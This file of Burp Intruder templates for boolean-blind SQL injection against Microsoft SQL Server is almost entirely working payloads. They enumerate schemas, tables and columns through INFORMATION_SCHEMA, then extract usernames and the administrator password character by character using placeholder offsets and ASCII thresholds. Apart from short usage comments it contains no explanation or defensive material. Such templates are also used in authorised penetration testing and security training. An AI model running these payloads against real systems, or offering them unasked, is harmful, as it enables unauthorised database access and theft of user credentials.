# SQL Server (MSSQL) Boolean-Blind Intruder Templates
# Usage:
# - Insert into vulnerable parameter; mark placeholders §…§.
# - Placeholders: §N§ (length), §POS§ (char index), §CUT§ (ASCII threshold), §OFFSET§ (row offset), §SCHEMA§ (schema), §TABLE§ (table)
# - Prefer CASE WHEN … THEN 1 ELSE 0 END or IF/ELSE emulation via CASE in scalar selects.
# - Signal via Content-Length/response diffs.

# --- Database/schema enumeration ---
# Schemas exist
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA)>0 THEN 1 ELSE 0 END)=1-- 
# Schema name length (by row)
' AND (SELECT CASE WHEN LEN((SELECT TOP 1 SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME OFFSET §OFFSET§ ROWS FETCH NEXT 1 ROWS ONLY))>§N§ THEN 1 ELSE 0 END)=1-- 
# Schema name char > CUT
' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT TOP 1 SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME OFFSET §OFFSET§ ROWS FETCH NEXT 1 ROWS ONLY),§POS§,1))>§CUT§ THEN 1 ELSE 0 END)=1-- 
# Schema name char == literal
' AND (SELECT CASE WHEN SUBSTRING((SELECT TOP 1 SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME OFFSET §OFFSET§ ROWS FETCH NEXT 1 ROWS ONLY),§POS§,1)='a' THEN 1 ELSE 0 END)=1-- 

# --- Table enumeration ---
# Any tables in schema
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='§SCHEMA§')>0 THEN 1 ELSE 0 END)=1-- 
# Table name length (by row)
' AND (SELECT CASE WHEN LEN((SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='§SCHEMA§' ORDER BY TABLE_NAME OFFSET §OFFSET§ ROWS FETCH NEXT 1 ROWS ONLY))>§N§ THEN 1 ELSE 0 END)=1-- 
# Table name char > CUT
' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='§SCHEMA§' ORDER BY TABLE_NAME OFFSET §OFFSET§ ROWS FETCH NEXT 1 ROWS ONLY),§POS§,1))>§CUT§ THEN 1 ELSE 0 END)=1-- 
# Table name char == literal
' AND (SELECT CASE WHEN SUBSTRING((SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='§SCHEMA§' ORDER BY TABLE_NAME OFFSET §OFFSET§ ROWS FETCH NEXT 1 ROWS ONLY),§POS§,1)='a' THEN 1 ELSE 0 END)=1-- 

# --- Column enumeration ---
# Column count for table
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='§SCHEMA§' AND TABLE_NAME='§TABLE§')>0 THEN 1 ELSE 0 END)=1-- 
# Column name length
' AND (SELECT CASE WHEN LEN((SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='§SCHEMA§' AND TABLE_NAME='§TABLE§' ORDER BY ORDINAL_POSITION OFFSET §OFFSET§ ROWS FETCH NEXT 1 ROWS ONLY))>§N§ THEN 1 ELSE 0 END)=1-- 
# Column name char > CUT
' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='§SCHEMA§' AND TABLE_NAME='§TABLE§' ORDER BY ORDINAL_POSITION OFFSET §OFFSET§ ROWS FETCH NEXT 1 ROWS ONLY),§POS§,1))>§CUT§ THEN 1 ELSE 0 END)=1-- 
# Column name char == literal
' AND (SELECT CASE WHEN SUBSTRING((SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='§SCHEMA§' AND TABLE_NAME='§TABLE§' ORDER BY ORDINAL_POSITION OFFSET §OFFSET§ ROWS FETCH NEXT 1 ROWS ONLY),§POS§,1)='a' THEN 1 ELSE 0 END)=1-- 

# --- Username/password extraction ---
# Enumerate usernames
' AND (SELECT CASE WHEN LEN((SELECT TOP 1 username FROM §SCHEMA§.users ORDER BY username OFFSET §OFFSET§ ROWS FETCH NEXT 1 ROWS ONLY))>§N§ THEN 1 ELSE 0 END)=1-- 
' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT TOP 1 username FROM §SCHEMA§.users ORDER BY username OFFSET §OFFSET§ ROWS FETCH NEXT 1 ROWS ONLY),§POS§,1))>§CUT§ THEN 1 ELSE 0 END)=1-- 
# Extract password for known user
' AND (SELECT CASE WHEN LEN((SELECT password FROM §SCHEMA§.users WHERE username='administrator'))>§N§ THEN 1 ELSE 0 END)=1-- 
' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT password FROM §SCHEMA§.users WHERE username='administrator'),§POS§,1))>§CUT§ THEN 1 ELSE 0 END)=1-- 
' AND (SELECT CASE WHEN SUBSTRING((SELECT password FROM §SCHEMA§.users WHERE username='administrator'),§POS§,1)='a' THEN 1 ELSE 0 END)=1-- 

# Notes:
# - For older SQL Server versions without OFFSET/FETCH, replace with TOP and subqueries or ROW_NUMBER() paging.

